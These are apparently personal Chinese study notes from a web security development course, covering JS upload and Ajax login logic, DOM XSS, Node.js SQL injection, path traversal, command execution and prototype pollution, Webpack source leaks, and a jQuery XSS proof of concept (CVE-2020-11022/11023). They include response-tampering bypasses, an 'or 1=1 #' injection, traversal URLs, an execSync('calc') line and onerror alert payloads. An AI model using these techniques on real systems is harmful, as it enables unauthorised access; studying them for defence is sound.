![image-20250818094958899](D:\cyberspace\笔记\图片\image-20250818094958899.png)

![image-20250818095005838](D:\cyberspace\笔记\图片\image-20250818095005838.png)

![image-20250818095016468](D:\cyberspace\笔记\图片\image-20250818095016468.png)

默认存储目录

![image-20250818095428601](D:\cyberspace\笔记\图片\image-20250818095428601.png)

有验证的：

![image-20250818095600961](D:\cyberspace\笔记\图片\image-20250818095600961.png)

### 前端页面渲染-MVC 模型

![image-20250818100121790](D:\cyberspace\笔记\图片\image-20250818100121790.png)

![image-20250818100219510](D:\cyberspace\笔记\图片\image-20250818100219510.png)

![image-20250818100351096](D:\cyberspace\笔记\图片\image-20250818100351096.png)





### 版本漏洞

[ThinkPHP8反序列化漏洞复现 - /1dreamGN/Blog](https://gowninng.cn/archives/thinkphp8fan-xu-lie-hua-fu-xian)

<br/>

# 第28天：安全开发-JS应用&原生开发&JQuery库&Ajax技术&前端后端&安全验证处理

```
1、JS 应用-原生态开发&第三库开发 
2、JS 功能-文件上传&登录验证&商品购买 

功能：登录验证，文件操作，商品购买，数据库操作，云应用接入，框架开发等 
技术：原生开发，DOM 树，常见库使用(JQuery)，框架开发（Vue，Nodejs）等 
```

```
#参考 
1、原生 JS 教程 
https://www.w3school.com.cn/js/index.asp 
2、jQuery 库教程 
https://www.w3school.com.cn/jquery/index.asp  
#JS 原生开发-文件上传-变量&对象&函数&事件 
1、布置前端页面 
2、JS 获取提交数据 
3、JS 对上传格式判断 
4、后端对上传数据处理 
前端 JS 进行后缀过滤，后端 PHP 进行上传处理 
架构：html js php - upload.php 
安全问题： 
1、过滤代码能看到分析绕过 
2、禁用 JS 或删除过滤代码绕过 
 
#JS 导入库开发-登录验证-JQuery 库&Ajax 技术 
0、布置前端页面 
1、获取登录事件 
2、配置 Ajax 请求 
3、后端代码验证 
4、成功回调判断 
后端 PHP 进行帐号判断，前端 JS 进行登录处理 
架构：html js login.html - logincheck.php 
 
#JS 导入库开发-逻辑购买-JQuery 库&Ajax 技术 
1、布置前端页面 
2、获取登录事件 
3、配置 Ajax 请求 
4、后端代码验证 
5、成功回调判断 
架构：html js shop.html - shopcheck.php 
 
#实例测试-某违规 APP-密码找回&JS 验证逻辑安全 
```

```
功能:登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等技术:原生开发，DOM，常见库使用，框架开发(Vue，Nodes)，打包器(Webpack)等安全:原生开发安全，NodeJs安全，Vue安全，打包器webpack安全，三方库安全问题等
```

## JS 原生开发-文件上传-变量&对象&函数&事件

布置前端页面 

![image-20250818180306567](D:\cyberspace\笔记\图片\image-20250818180306567.png)

JS 获取提交数据 

![image-20250818215142238](D:\cyberspace\笔记\图片\image-20250818215142238.png)

文件保存用php

![image-20250818220402604](D:\cyberspace\笔记\图片\image-20250818220402604.png)

之前用php写的文件上传在前端是看不到代码的

![image-20250818220504814](D:\cyberspace\笔记\图片\image-20250818220504814.png)

js写的可以看到js文件的代码

![image-20250818220547545](D:\cyberspace\笔记\图片\image-20250818220547545.png)

可以保存源代码（ctrl+u）

![image-20250818220921342](D:\cyberspace\笔记\图片\image-20250818220921342.png)

另存为up.html文件，找到关键的onchange

![image-20250818221007953](D:\cyberspace\笔记\图片\image-20250818221007953.png)

删除，再把跳转页面的upload换一下

![image-20250818221524084](D:\cyberspace\笔记\图片\image-20250818221524084.png)

![image-20250818223020211](D:\cyberspace\笔记\图片\image-20250818223020211.png)

我们浏览器打开html文件上传文件就可以上传到JS目录里面upload文件夹里面了，并且不限文件格式因为我们删除了CheckFileExt

## JS 导入库开发-登录验证-JQuery 库&Ajax 技术

login.html：

![image-20250818223658483](D:\cyberspace\笔记\图片\image-20250818223658483.png)

这里把action跳转到php文件的表单注释了，用JS来登录

需要用到JQuery库

![image-20250818224010412](D:\cyberspace\笔记\图片\image-20250818224010412.png)

下载复制到JS目录，引用并创建事件函数

![image-20250818224840097](D:\cyberspace\笔记\图片\image-20250818224840097.png)

官方文档看操作函数

![image-20250818224812547](D:\cyberspace\笔记\图片\image-20250818224812547.png)

![image-20250818225111879](D:\cyberspace\笔记\图片\image-20250818225111879.png)

| *url*                              | 必需。规定把请求发送到哪个 URL。                             |
| ---------------------------------- | ------------------------------------------------------------ |
| *data*                             | 可选。映射或字符串值。规定连同请求发送到服务器的数据。       |
| *success(data, textStatus, jqXHR)* | 可选。请求成功时执行的回调函数。                             |
| *dataType*                         | 可选。规定预期的服务器响应的数据类型。默认执行智能判断（xml、json、script 或 html）。 |

data这里小迪讲的是获取的是class值，后面看弹幕建议使用唯一标识id来

![image-20250818231032367](D:\cyberspace\笔记\图片\image-20250818231032367.png)

success部分：

![image-20250818231348412](D:\cyberspace\笔记\图片\image-20250818231348412.png)

longincheck.php部分：

![image-20250818231357311](D:\cyberspace\笔记\图片\image-20250818231357311.png)

尝试登录查看console

![image-20250818231847891](D:\cyberspace\笔记\图片\image-20250818231847891.png)

把这个infoCode写在js文件是不安全的，因为js逻辑可以在前端被看到，被知道当infoCode等于1的时候就跳转到后台，那么就可以通过抓包修改就能进入后台

![image-20250818232907460](D:\cyberspace\笔记\图片\image-20250818232907460.png)

抓包

![image-20250818232604866](D:\cyberspace\笔记\图片\image-20250818232604866.png)

发送到intercept，查看返回包

![](D:\cyberspace\笔记\图片\image-20250818232622878.png)

返回包显示了infoCode

![image-20250818232741787](D:\cyberspace\笔记\图片\image-20250818232741787.png)

把infoCode改成1之后再发出去

![image-20250818232814142](D:\cyberspace\笔记\图片\image-20250818232814142.png)

![image-20250818232827771](D:\cyberspace\笔记\图片\image-20250818232827771.png)

进入后台了

想要安全就不能把location.href='index.php';写在js，而是写在php

![image-20250818233110407](D:\cyberspace\笔记\图片\image-20250818233110407.png)

再抓一次包试试会发现虽然提示登陆成功了但是并不会跳转到后台

## JS 导入库开发-逻辑购买-JQuery 库&Ajax 技术 

前端页面根据上一个登录的稍加修改：

![image-20250819111213626](D:\cyberspace\笔记\图片\image-20250819111213626.png)

shop.php也是：

![image-20250819111011293](D:\cyberspace\笔记\图片\image-20250819131605070.png)

后续的抓包修改就和上面的那个一样了

后面小迪还演示了一个忘记密码的验证，就是先输入正确手机号、验证码之后拿到返回包的内容，下次就随便输入验证码之后也是抓包拿到返回包，把返回包的内容改成之前正确的返回包之后发送就会发现也进入了重置密码的界面

<br/>

# 第29天：安全开发-JS应用&DOM树&加密编码库&断点调试&逆向分析&元素属性操作

```
1、JS 技术-DOM 树操作及安全隐患 
2、JS 技术-加密编码及数据安全调试 
```

```
#JS 原生开发-DOM 树-用户交互 
DOM：文档操作对象 
浏览器提供的一套专门用来操作网页代码内容的功能，实现自主或用户交互动作反馈  
安全问题：本身的前端代码通过 DOM 技术实现代码的更新修改，但是更新修改如果修改的数据可以由用户来指定，就会造成 DOM-XSS 攻击！ 
1、获取对象 
标签：直接写 
Class：加上符号. 
id：加上符号# 
<h1 id="myHeader" onclick="getValue()">这是标题</h1> 
document.querySelector('h1') 
document.querySelector('.id') 
document.querySelector('#myHeader') 
 
2、获取对象属性 
<h1 id="myHeader" onclick="getValue()">这是标题</h1> 
const h1=document.querySelector('h1') 
const id=h1.id 
console.log(id) 
 
2、操作元素数据 
innerHTML 解析后续代码 
innerText 不解析后续代码 
 
3、操作元素属性 
 
#JS 导入库开发-编码加密-逆向调试 
//Base64 
 
//MD5 
<script src="js/md5.js"></script> 
<script> 
 var str1 = 'xiaodisec' 
 var str_encode = md5(str1); 
 console.log(str_encode) 
</script> 

//SHA1
<!DOCTYPE html>
<script src="js/crypto-js.js"></script><script>
var strl='xiaodisec';
var str_encode =CryptoJs.SHA1(strl).tostring();// 注意:1是数字1
console.log(str_encode)
</script>
</html>

//HMAC
<script src="js/crypto-js.js"></script>
<script>
var key= 'key';
var strl='xiaodisec';
var hash =CryptoJS.HmacSHA256(key,strl);
var str encode=CryptoJS.enc.Hex.stringify(hash);
console.log(strencode)//
'11a7960cd583ee2c3f1ed910dbc3b6c3991207cbc527d122f69e84d13cc5ce5c'
</script>
```

```
功能:登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等技术:原生开发，DOM，常见库使用，框架开发(Vue，Nodes)，打包器(Webpack)等安全:原生开发安全，NodeJs安全，Vue安全，打包器webpack安全，三方库安全问题等
```

## JS 原生开发-DOM 树-用户交互

![image-20250819204847533](D:\cyberspace\笔记\图片\image-20250819204847533.png)

点击刷新之后会显示文件名

![image-20250819204841513](D:\cyberspace\笔记\图片\image-20250819204841513.png)



![image-20250820110403169](D:\cyberspace\笔记\图片\image-20250820110403169.png)

![image-20250820110421027](D:\cyberspace\笔记\图片\image-20250820110421027.png)

标题刷新

![image-20250820164910846](D:\cyberspace\笔记\图片\image-20250820164910846.png)

图片刷新

![image-20250821201329904](D:\cyberspace\笔记\图片\image-20250821201329904.png)

就是用document.querySelector('img')获取之后用.接里面的内容可以获取值

安全问题：DOM XSS

![image-20250822090024844](D:\cyberspace\笔记\图片\image-20250822090024844.png)

这里的值在点击刷新后就会传到imf的src中去

![image-20250822090049744](D:\cyberspace\笔记\图片\image-20250822090049744.png)

DOM就是当用户输入是页面发生变化，有事件之后就会更改这个值

## JS 导入库开发-编码加密-逆向调试

安装三个包

```
npm install crypto-js jsencrypt js-md5
```

![image-20250822101118351](D:\cyberspace\笔记\图片\image-20250822101118351.png)

md5加密

![image-20250822102324763](D:\cyberspace\笔记\图片\image-20250822102324763.png)

![image-20250822102331773](D:\cyberspace\笔记\图片\image-20250822102331773.png)

SHA1加密

![image-20250822102924784](D:\cyberspace\笔记\图片\image-20250822102924784.png)

![image-20250822102930952](D:\cyberspace\笔记\图片\image-20250822102930952.png)

HMAC加密

![image-20250822103210746](D:\cyberspace\笔记\图片\image-20250822103210746.png)

![image-20250822103220593](D:\cyberspace\笔记\图片\image-20250822103220593.png)

AES

![image-20250822103431639](D:\cyberspace\笔记\图片\image-20250822103431639.png)

![image-20250822103446383](D:\cyberspace\笔记\图片\image-20250822103446383.png)

## 两则案例分析-解析安全&登录调试 

### xiaodi博客

登陆界面看login.php

![image-20250822104827196](D:\cyberspace\笔记\图片\image-20250822104827196.png)

一个ajax登录按钮，也就是单击登陆事件->声明变量->发送数据，然后密码是MD5加密

![image-20250822105057960](D:\cyberspace\笔记\图片\image-20250822105057960.png)

![image-20250822105230000](D:\cyberspace\笔记\图片\image-20250822105230000.png)

这样可以知道加密就是MD5加密

在网站中要测试，如果不知道加密算法，你发送过去的数据如果是明文那么网站压根就不知道你发的是什么，没有效

### 申通

登录看网络，出现一个LoginResult

![image-20250822110629096](D:\cyberspace\笔记\图片\image-20250822110629096.png)

```
UserName
LbNtTCXXoVcs+vKnYeWx8iM2Z+1HuAaRJGmQ1Tp+EMbUkCl1Dbwu4j9IFI2DETNHjP2Kc5vUH5bfQErllsGxSYpf0eoErI2S28DuCuEjG+X6izXGScNwef5pi/dUZEeC2n4ylsLcTlOqc1ON/TKaJ5iTAmKXuVDoZ6boGuV2keo=
Mobile
xxjRmQ0WyQxXfKf6ReRQEqIYTDL0aN4Rcou/70PjSJ1VNSht9h9dS1VtxJExl+ngxspzQp1wRgkL7esOtMqqLegxCxGqHppjP/Mv4QT6y77PazcNUH0ELae572gr0G7YH/jXQDvI6jfBYtcoCKPJT8lawnB6ayfbKJPEI2N9ESc=
Password
I6e6TNvJaGqhL20ouFRaIYsc69GX3hqBE3lJqzVaq5N6q7wHp16Ge7/CXnHlF6vV51qcUBIQZlAAsQcvAW1az9m53wDF8cNVpLjnduOpO5yHnCma8Fds13Ge6raMJSb7iua4WeUZemhj+wA+uxQRr6BaVdgn9CaUgzGzABE4Yf0=
```

点表单，看用户名是用什么发送的（检查）

![image-20250822110815228](D:\cyberspace\笔记\图片\image-20250822110815228.png)

发现numMobile，全局搜索

![image-20250822111145592](D:\cyberspace\笔记\图片\image-20250822111145592.png)

发现encrypt，但是直接拿去控制台会用不了

![image-20250822111300106](D:\cyberspace\笔记\图片\image-20250822111300106.png)

断点

![image-20250822111824728](D:\cyberspace\笔记\图片\image-20250822111824728.png)

![image-20250822111814391](D:\cyberspace\笔记\图片\image-20250822111814391.png)

再次回到控制台会发现可以用了

![image-20250822111911457](D:\cyberspace\笔记\图片\image-20250822111911457.png)

后续测试也可以直接改攻击语句

![image-20250822111924109](D:\cyberspace\笔记\图片\image-20250822111924109.png)

就是后续测试的时候传的值就是加密后的值，这样的测试攻击就有效

<br/>

# 第30天：安全开发-JS应用&NodeJS指南&原型链污染&Express框架&功能实现&审计

```
1、NodeJS-开发环境&功能实现 
2、NodeJS-安全漏洞&案例分析 
3、NodeJS-开发指南&特有漏洞
```

```
#环境搭建-NodeJS-解析安装&库安装 
0、文档参考： 
https://www.w3cschool.cn/nodejs/ 
1、Nodejs 安装 
https://nodejs.org/en 
 
2、三方库安装 
express 
Express 是一个简洁而灵活的 node.js Web 应用框架 
 
body-parser 
node.js 中间件，用于处理 JSON, Raw, Text 和 URL 编码的数据。 
 
cookie-parser 
这就是一个解析 Cookie 的工具。通过 req.cookies 可以取到传过来的 cookie，并把它们转成对象。 
 
multer 
node.js 中间件，用于处理 enctype="multipart/form-data"（设置表单的 MIME编码）的表单数据。 
 
mysql 
Node.js 来连接 MySQL 专用库，并对数据库进行操作。 
 
安装命令： 
npm i express 
npm i body-parser 
npm i cookie-parser 
npm i multer 
npm i mysql 
 
#功能实现-NodeJS-数据库&文件&执行 
-登录操作 
1、Express 开发 
2、实现用户登录 
3、加入数据库操作 
 
-文件操作 
1、Express 开发 
2、实现目录读取 
3、加入传参接受

-命令执行(RCE)
1、eval
2、exec & spawnSyn

#安全问题-NodeJs-注入&RCE&原型链
1、SQL注入&文件操作
2、RCE执行&原型链污染
2、NodeJs黑盒无代码分析
实战测试NodeJs安全:
判断:参考前期的信息收集
黑盒:通过对爸种功能和参数进行payload测试
白盒:通过对代码中写法安全进行审计分析
-原型链污染
如果攻击者控制并修改了一个对象的原型，(__proto__)
那么将可以影响所有和这个对象来自同一个类、父祖类的对象。

#案例分析-NodeJS-CTF题目&源码审计
1、CTFSHOW几个题目
https://ctf.show/Web334-3442
https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/
2、YApi管理平台漏洞
https://blog.csdn.net/weixin_42353842/article/details/127960229

#开发指南-NodeJs-安全SecGuide项目
https://github.com/Tencent/secguide
```

```
功能:登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等技术:原生开发，DOM，常见库使用，框架开发(Vue，Nodes)，打包器(Webpack)等安全:原生开发安全，NodeJs安全，Vue安全，打包器webpack安全，三方库安全问题等
```

## 环境搭建-NodeJS-解析安装&库安装

nodejs安装，安装express

![image-20250822171006046](D:\cyberspace\笔记\图片\image-20250822171006046.png)

运行

![image-20250822171015110](D:\cyberspace\笔记\图片\image-20250822171015110.png)

访问

![image-20250822171022036](D:\cyberspace\笔记\图片\image-20250822171022036.png)

- **前端JS**：在浏览器中按F12可以看到所有HTML/CSS/JS源代码
- **Node.js**：运行在服务器端，用户无法通过浏览器查看服务器代码

### 登录

sql.html

![image-20250822172138010](D:\cyberspace\笔记\图片\image-20250822172138010.png)

![image-20250822172143402](D:\cyberspace\笔记\图片\image-20250822172143402.png)

sql.js

![image-20250828150044862](D:\cyberspace\笔记\图片\image-20250828150044862.png)

启动查看

![image-20250828150055636](D:\cyberspace\笔记\图片\image-20250828150055636.png)

访问，注意路由是login

```
http://localhost:3000/login
```

![image-20250828150930822](D:\cyberspace\笔记\图片\image-20250828150930822.png)

加一个首页

![image-20250828202013746](D:\cyberspace\笔记\图片\image-20250828202013746.png)

![image-20250828202007386](D:\cyberspace\笔记\图片\image-20250828202007386.png)

html文件

![image-20250828202300043](D:\cyberspace\笔记\图片\image-20250828202300043.png)

![image-20250828202306947](D:\cyberspace\笔记\图片\image-20250828202306947.png)

用了html文件之后需要接收两个数据

![image-20250828202621119](D:\cyberspace\笔记\图片\image-20250828202621119.png)

req.query：获取URL的查询参数串，所以这里的post要改成get，js里面的也是

![image-20250829093901511](D:\cyberspace\笔记\图片\image-20250829093901511.png)

![image-20250829095342081](D:\cyberspace\笔记\图片\image-20250829095342081.png)

登录

![image-20250829094031189](D:\cyberspace\笔记\图片\image-20250829094031189.png)

![image-20250829094128641](D:\cyberspace\笔记\图片\image-20250829094128641.png)

POST路由来实现，引入库

![image-20250829094909047](D:\cyberspace\笔记\图片\image-20250829094909047.png)

安装库，写js，html里面的方法改成post

![image-20250829095328303](D:\cyberspace\笔记\图片\image-20250829095328303.png)

登录

![image-20250829095416709](D:\cyberspace\笔记\图片\image-20250829095416709.png)

## 功能实现-NodeJS-数据库&文件&执行

### 数据库

![image-20250829100239678](D:\cyberspace\笔记\图片\image-20250829100239678.png)

![image-20250829100559868](D:\cyberspace\笔记\图片\image-20250829100559868.png)

![image-20250829100552557](D:\cyberspace\笔记\图片\image-20250829100552557.png)

这里取出来的是列表

![image-20250829100749967](D:\cyberspace\笔记\图片\image-20250829100749967.png)

取第0行的username和password

这样写会有sql注入产生，改一下sql然后把数据库部分放进post请求

![image-20250829102010803](D:\cyberspace\笔记\图片\image-20250829102010803.png)

![image-20250829102042888](D:\cyberspace\笔记\图片\image-20250829102042888.png)

报错处理

![image-20250829102557451](D:\cyberspace\笔记\图片\image-20250829102557451.png)

查询语句是

```
select * from admin where username="admin" and password="123456"
```

sql注入写法

```
select * from admin where username="admin" or 1=1 # and password="123456"
```

#注释了后续的语句

![image-20250829102859456](D:\cyberspace\笔记\图片\image-20250829102859456.png)

![image-20250829102906075](D:\cyberspace\笔记\图片\image-20250829102906075.png)

因为这里的判断是接收的值

![image-20250829102919787](D:\cyberspace\笔记\图片\image-20250829102919787.png)

所以不会进入后台

### 文件管理

![image-20250829103815287](D:\cyberspace\笔记\图片\image-20250829103815287.png)

获取当前目录

![image-20250829103856857](D:\cyberspace\笔记\图片\image-20250829103856857.png)

获取dir

![image-20250829104721396](D:\cyberspace\笔记\图片\image-20250829104721396.png)

```
http://127.0.0.1:3000/file?dir=./
http://127.0.0.1:3000/file?dir=../
http://127.0.0.1:3000/file?dir=c:/
```

![image-20250829104813685](D:\cyberspace\笔记\图片\image-20250829104813685.png)

## 安全问题-NodeJS-注入&RCE&原型链

### 系统命令执行

简单执行计算器

![image-20250829105214622](D:\cyberspace\笔记\图片\image-20250829105214622.png)

exec和spawnSync都可以

### 代码命令执行

eval

![image-20250829105921505](D:\cyberspace\笔记\图片\image-20250829105921505.png)

![image-20250829105927543](D:\cyberspace\笔记\图片\image-20250829105927543.png)

代码命令执行跳到系统命令执行

![image-20250829110109446](D:\cyberspace\笔记\图片\image-20250829110109446.png)

nodejs判断

![image-20250829110718162](D:\cyberspace\笔记\图片\image-20250829110718162.png)

### 原型链

![image-20250829144229661](D:\cyberspace\笔记\图片\image-20250829144229661.png)

命令执行

![image-20250829144329835](D:\cyberspace\笔记\图片\image-20250829144329835.png)

```
require('child_process').execSync('calc')
```

这会在Windows系统上打开计算器程序

## 案例分析-NodeJS-CTF 题目&源码审计



## 开发指南-NodeJS-安全 SecGuide 项目 



<br/>

# 第31天：安全开发-JS应用&WebPack打包器&第三方库JQuery&安装使用&安全检测

```
#打包器-WebPack-使用&安全 
参考：https://mp.weixin.qq.com/s/J3bpy-SsCnQ1lBov1L98WA 
Webpack 是一个模块打包器。在 Webpack 中会将前端的所有资源文件都作为模块处理。它将根据模块的依赖关系进行分析，生成对应的资源。 
 
五个核心概念: 
1. 【入口(entry)】：指示 webpack 应该使用哪个模块，来作为构建内部依赖图开始。 
2. 【输出(output)】：在哪里输出文件，以及如何命名这些文件。 
3. 【Loader】：处理那些非 JavaScript 文件（webpack 自身只能解析 
JavaScript 和 json）。webpack 本身只能处理 JS、JSON 模块，如果要加载其他类型的文件(模块)，就需要使用对应的 loader。 
4. 【插件(plugins)】：执行范围更广的任务，从打包到优化都可以实现。 
5. 【模式(mode)】：有生产模式 production 和开发模式 development。 
 
使用： 
1、创建需打包文件 
2、安装 webpack 库 
3、创建 webpack 配置文件 
4、运行 webpack 打包命令 
安全： 
1、WebPack 源码泄漏-模式选择 
2、模糊提取安全检查-PacketFuzzer 
https://github.com/rtcatc/Packer-Fuzzer 
原生态 JS：前端语言直接浏览器显示源代码 
NodeJS：服务段语言浏览器不显示源代码 
WebPack：打包模式选择开发者模式后会造成源码泄漏（nodejs vue） 
 
#第三方库-JQuery-使用&安全 
jQuery 是一个快速、简洁的 JavaScript 框架,是一个丰富的 JavaScript 代码库。
设计目的是为了写更少的代码，做更多的事情。它封装 JavaScript 常用功能代码，提
供一种简便的 JavaScript 设计模式，优化 HTML 文档操作、事件处理、动画设计和
Ajax 交互。 
 
1、使用： 
引用路径：
2、安全： 
检测：http://research.insecurelabs.org/jquery/test/ 
测试：CVE-2020-11022/CVE-2020-11023 
```

```
功能:登录验证，文件操作，SQL操作，云应用接入，框架开发，打包器使用等技术:原生开发，DOM，常见库使用，框架开发(Vue，Nodes)，打包器(Webpack)等安全:原生开发安全，NodeJs安全，Vue安全，打包器webpack安全，三方库安全问题等
```

## 打包器-WebPack-使用&安全

简单举例的文件引用

src下的1.js

![image-20250829171047176](D:\cyberspace\笔记\图片\image-20250829171047176.png)

src下的2.js

![image-20250829171056966](D:\cyberspace\笔记\图片\image-20250829171056966.png)

index.html

![image-20250829171107141](D:\cyberspace\笔记\图片\image-20250829171107141.png)

控制台会显示test，但是如果非常多的js文件这样一个个引用会很麻烦，可以用WebPack来打包很多函数，并且代码看起来更加规矩

### 创建打包文件

1.js

![image-20250829172818028](D:\cyberspace\笔记\图片\image-20250829172818028.png)

2.js

![image-20250829172824731](D:\cyberspace\笔记\图片\image-20250829172824731.png)

main.js

![image-20250829174605880](D:\cyberspace\笔记\图片\image-20250829174605880.png)

index.html

![image-20250829172845790](D:\cyberspace\笔记\图片\image-20250829172845790.png)

### 安装 webpack 库 

```
npm install --save-dev webpack webpack-cli
```

### 创建 webpack 配置文件 

webpack.config.js文件

![image-20250829173651742](D:\cyberspace\笔记\图片\image-20250829173651742.png)

### 运行 webpack 打包命令 

```
npx webpack
```

![image-20250829175306428](D:\cyberspace\笔记\图片\image-20250829175306428.png)

得到bulid目录下的app.js

![image-20250829174628700](D:\cyberspace\笔记\图片\image-20250829174628700.png)

在index.html里面引用打包好的文件

![image-20250829175403372](D:\cyberspace\笔记\图片\image-20250829175403372.png)

控制台有结果了

![image-20250829175421735](D:\cyberspace\笔记\图片\image-20250829175421735.png)

### 开发者模式

上面的打包方法用的是开发者模式，也就是development

![image-20250829180250908](D:\cyberspace\笔记\图片\image-20250829180250908.png)

这个模式在前端界面可以看到源码和代码逻辑

![image-20250829180347470](D:\cyberspace\笔记\图片\image-20250829180347470.png)

### 生产者模式

![image-20250829180431957](D:\cyberspace\笔记\图片\image-20250829180431957.png)

继续打包操作得到app.js文件会发现代码很短

![image-20250829180601997](D:\cyberspace\笔记\图片\image-20250829180601997.png)

访问index.html

![image-20250829180654561](D:\cyberspace\笔记\图片\image-20250829180654561.png)

这个和上一个对比会发现源代码看不到了，得到的app.js也直接显示出来的结果

也就是说如果打包的时候选择的是开发者模式就会造成源码泄露

## 第三方库-JQuery-使用&安全 

[【JQuery-XSS漏洞（CVE-2020-11022/CVE-2020-11023）漏洞复现】_jquery xss-CSDN博客](https://blog.csdn.net/qq_61872115/article/details/134142487)

JQuery版本大于等于1.2 ,小于 3.5.0

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jQuery XSS Examples (CVE-2020-11022/CVE-2020-11023)</title>
    <!-- 修改为本地jQuery文件 -->
    <script src="./jquery-3.4.1/jquery-3.4.1.js"></script>
    <!-- <script src="./jquery-3.5.1/jquery-3.5.1.js"></script> -->
</head>
<body>
<script>
function test(n,jq){
    sanitizedHTML = document.getElementById('poc'+n).innerHTML;
    if(jq){
        $('#div').html(sanitizedHTML);
    }else{
        div.innerHTML=sanitizedHTML;
    }
}
</script>
<h1>jQuery XSS Examples (CVE-2020-11022/CVE-2020-11023)</h1>
<p>PoCs of XSS bugs fixed in <a href="//blog.jquery.com/2020/04/10/jquery-3-5-0-released/">jQuery 3.5.0</a>. You can find the details in my blog post: <a href="//mksben.l0.cm/2020/05/jquery3.5.0-xss.html">English</a> / <a href="//masatokinugawa.l0.cm/2020/05/jquery3.5.0-xss.html">日本語</a></p>
 
<h2>PoC 1</h2>
<button onclick="test(1)">Assign to innerHTML</button> <button onclick="test(1,true)">Append via .html()</button>
<xmp id="poc1">
<style><style /><img src=x onerror=alert('XSS-PoC1')> 
</xmp>
 
<h2>PoC 2 (Only jQuery 3.x affected)</h2>
<button onclick="test(2)">Assign to innerHTML</button> <button onclick="test(2,true)">Append via .html()</button>
<xmp id="poc2">
<img alt="<x" title="/><img src=x onerror=alert('XSS-PoC2')>">
</xmp>
 
<h2>PoC 3</h2>
<button onclick="test(3)">Assign to innerHTML</button> <button onclick="test(3,true)">Append via .html()</button>
<xmp id="poc3">
<option><style></option></select><img src=x onerror=alert('XSS-PoC3')></style>
</xmp>
 
<div id="div"></div>

<script>
// 显示当前使用的jQuery版本
document.write('<p>当前使用jQuery版本: ' + $.fn.jquery + '</p>');
</script>
</body>
</html>
```

### 3.4.1

![image-20250829214421065](D:\cyberspace\笔记\图片\image-20250829214421065.png)

![image-20250829214611890](D:\cyberspace\笔记\图片\image-20250829214611890.png)

test函数，jq是true，进入if

jQuery 的 `.html()` 方法在将字符串变成真实的DOM元素并插入到div里之前，**必须先对它进行解析**

`$('#div').html(sanitizedHTML)` 这行代码的作用就是把 `sanitizedHTML` 变量里的字符串（也就是 `<style><style /><img src=x onerror=alert('XSS-PoC1')>`）设置到 `<div id="div"></div>` 这个容器里

由于解析错误，`<img src=x onerror=alert('XSS-PoC1')>` 这段代码没有被当作纯文本，而是被当作一个**真实的、需要执行的HTML标签**插入了到DOM中。

浏览器渲染引擎看到了这个 `<img>` 标签，就会去加载它的 `src`

因为 `src="x"` 是一个无效的地址，图片加载**失败**

图片加载失败会**触发** `onerror` 事件，于是 `alert('XSS-PoC1')` 这段JavaScript代码就被执行了，弹窗就出现了

![image-20250829215150888](D:\cyberspace\笔记\图片\image-20250829215150888.png)

传入之后的iv是

```
<div id="div">

</div>
```

- jQuery的解析器看到 `<style><style />` 时，犯了一个关键错误。
- 它认为 `<style />` 是一个**自闭合标签**，等同于 `<style></style>`。
- 解析器认为第一个 `<style>` 标签已经**被闭合了**。
- 于是，它把接下来的 `<img>` 标签解析到了 `<style>` 标签**之外**。
- 浏览器看到这个独立的 `<img>` 标签，就会去加载 `src="x"`，加载失败触发 `onerror`，执行 `alert`。

![image-20250829215955597](D:\cyberspace\笔记\图片\image-20250829215955597.png)

### 3.5.1

div是

```
<div id="div">
<style><style /><img src=x onerror=alert('XSS-PoC1')> 
</style></div>
```

- jQuery团队修改了解析器逻辑。
- 新解析器**不再将`<style />`视为自闭合标签**而提前结束样式块。
- 它将整个 `<style /><img src=x onerror=alert('XSS-PoC1')>` 都视为 `<style>` 标签的**文本内容**。
- 在HTML中，`<style>` 标签内的内容不会被浏览器当作HTML元素解析，只会被当作文本。
- 因此，`<img>` 标签永远不会被浏览器当作真实的图像元素处理，`onerror` 事件自然也不会触发。

![image-20250829220018994](D:\cyberspace\笔记\图片\image-20250829220018994.png)

<br/>

# 第32天：安全开发-JavaEE应用&Servlet路由技术&JDBC&Mybatis数据库&生命周期

```
#JavaEE-HTTP-Servlet&路由&周期 
参考：https://blog.csdn.net/qq_52173163/article/details/121110753 
1、解释 
Servlet 是运行在 Web 服务器或应用服务器上的程序,它是作为来自 Web 浏览器或其他HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。使用 Servlet可以收集来自网页表单的用户输入，呈现来自数据库或者其他源的记录，还可以动态创建网页。本章内容详细讲解了 web 开发的相关内容以及 servlet 相关内容的配置使用,是JAVAEE 开发的重中之重。 
 
2、创建和使用 Servlet 
-创建一个类继承 HttpServlet 
-web.xml 配置 Servlet 路由 
-WebServlet 配置 Servlet 路由 
-写入内置方法(init service destroy doget dopost) 
 
3、Servlet 生命周期 
见图 
 
4、处理接受和回显 
● HttpServletRequest 是 ServletRequest 的子接口 
getParameter(name) — String 通过 name 获得值 
getParameterValues — String[ ] 通过 name 获得多值 
 
● HttpServletResponse 是 ServletResponse 的子接口 
setCharacterEncoding() 设置编码格式 
setContentType() 设置解析语言 
getWriter() 获得一个 PrintWriter 字符输出流输出数据 
PrintWriter 接受符合类型数据 
 
#JavaEE-数据库-JDBC&Mybatis&库 
-原生态数据库开发：JDBC 
参考：https://www.jianshu.com/p/ed1a59750127 
JDBC(Java Database connectivity): 由 java 提供,用于访问数据库的统一 API接口规范.数据库驱动: 由各个数据库厂商提供,用于访问数据库的 jar 包(JDBC 的具体实现),遵循 JDBC 接口,以便 java 程序员使用！ 
1、下载 jar 
https://mvnrepository.com/ 
2、引用封装 jar 
创建1ib目录，复制导入后，添加为库
3、注册数据库驱动
Class.forName("com.mysql.jdbc.Driver");
4、建立数据库连接
string url ="jdbc:mysql://localhost:3306/demo01";
Connection connection=DriverManager.getConnection (url,"x","x");
5、创建statement执行SQL
Statement statement=connection.createStatement();
ResultSet resultSet=statement.executeQuery(sql);
6、结果Resultset进行提取
while(resultSet.next()){
	int id = resultSet.getInt("id");
	String page_title = resultSet.getString("page title");
	......
}

-框架数据库开发:Mybatis
Mybatis是一款优秀的持久层框架,避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集的过程，减少了代码的冗余，减少程序员的操作。
```

```
功能:数据库操作，文件操作，序列化数据，身份验证，框架开发，第三方库使用等框架库:MyBatis,SpringMVC,SpringBoot，shiro,Log4j，FastJson等
技术:Servlet，Listen,Filter，Interceptor，JWT，AOP，待补充
